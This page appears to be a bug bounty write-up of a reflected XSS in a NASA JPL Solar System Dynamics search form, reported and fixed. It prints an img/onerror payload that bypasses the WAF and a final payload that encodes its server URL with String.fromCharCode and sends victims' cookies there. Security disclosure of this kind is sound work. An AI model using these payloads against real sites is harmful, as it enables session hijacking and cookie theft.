---
layout: default
---

<div class="container">
<article>
  <a href="../../../en/" class="back-btn">
    <svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"></polyline></svg>
    {{ site.title }}
  </a>

  <div class="bounty-header">
    <h1>NASA JPL: Search Form XSS Cookie Exfiltration</h1>
    <p style="color: var(--p3); font-weight: 600;">NASA JPL - Solar System Dynamics (SSD) Group</p>
  </div>

  <div class="bounty-content">
    <h2>🔍 Initial Discovery</h2>
    <p>As with every bug bounty program, the first thing to do was to use the page as a normal user would. The search field caught our eye, so we tested it:</p>
    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/search.png" alt="Search Field">
    <p>By including several characters like <code>" / ' > <</code>, we observed that they were reflected in the source code without sanitization:</p>
    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/ReflectedChar.png" alt="Reflected Characters">

    <h2>🛡️ WAF Bypass</h2>
    <p>Initially, we tried to use a simple payload like <code><script>alert(1)</script></code>, but the <strong>NASA WAF (Web Application Firewall)</strong> blocked the request:</p>
    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/BlockedWAF.png" alt="Blocked by WAF">
    <p>To bypass this, we tried various encodings and different tags. We found that using the <code><img></code> tag with an <code>onerror</code> event was successful in bypassing the firewall:</p>
    <pre><code>&lt;img src=x onerror=alert(1)&gt;</code></pre>
    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/WAFBypass.png" alt="WAF Bypass Alert">

    <h2>🚀 Final Exploit (Cookie Exfiltration)</h2>
    <p>Once we had a functional XSS, we decided to escalate it to steal session cookies. To avoid suspicious characters in the URL, we used <code>String.fromCharCode</code> to encode our payload:</p>
    <pre><code>&lt;img src=x onerror=document.location=String.fromCharCode(104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,47,63,99,61)+document.cookie&gt;</code></pre>
    <p>This redirected the victim (and their cookies) to our controlled server. Below is the exfiltration request captured in our logs:</p>
    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/ExfiltrationRequest.png" alt="Exfiltration Request">
    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/ExfiltrationCookies.png" alt="Exfiltrated Cookies">

    <h2>📜 Official Recognition</h2>
    <p>After reporting the vulnerability responsibly, NASA investigated and fixed it. We received an official recognition letter from the <strong>NASA JPL Solar System Dynamics</strong> group.</p>
    
    <div class="pdf-container">
      <iframe src="../../../assets/pdf/nasa-jpl-ecco-xss-waf-bypass/acknowledgment.pdf#toolbar=0&navpanes=0&scrollbar=0" width="100%" height="100%" style="border: none;"></iframe>
    </div>
    
    <div style="text-align: center; margin-top: 1rem;">
      <a href="../../../assets/pdf/nasa-jpl-ecco-xss-waf-bypass/acknowledgment.pdf" class="lang-btn" target="_blank">📥 Download Official Letter (PDF)</a>
    </div>

    <h2>🤝 Collaboration Details</h2>
    <p>This research was conducted in a joint effort with the following researchers:</p>
    <ul>
      <li><strong>{{ site.researchers.ivan.name }}</strong> (Lead Researcher)</li>
      <li><strong>{{ site.researchers.diego.name }}</strong> (Security Analyst)</li>
    </ul>

    <div class="card-grid" style="margin-top: 3rem;">
      <div class="glass-card">
        <small>Impact</small>
        <strong>Session Hijacking Potential</strong>
      </div>
      <div class="glass-card">
        <small>Severity</small>
        <strong>P3 (Medium)</strong>
      </div>
    </div>
  </div>
</article>
</div>

<!-- Image Zoom Overlay -->
<div id="zoomOverlay" class="zoom-overlay">
  <img id="zoomImg" src="" alt="Zoomed Image">
</div>

<script>
document.querySelectorAll('.bounty-content img').forEach(img => {
  img.addEventListener('click', () => {
    const overlay = document.getElementById('zoomOverlay');
    const zoomImg = document.getElementById('zoomImg');
    zoomImg.src = img.src;
    overlay.classList.add('active');
  });
});

document.getElementById('zoomOverlay').addEventListener('click', () => {
  document.getElementById('zoomOverlay').classList.remove('active');
});

document.addEventListener('keydown', e => {
  if (e.key === 'Escape') document.getElementById('zoomOverlay').classList.remove('active');
});
</script>
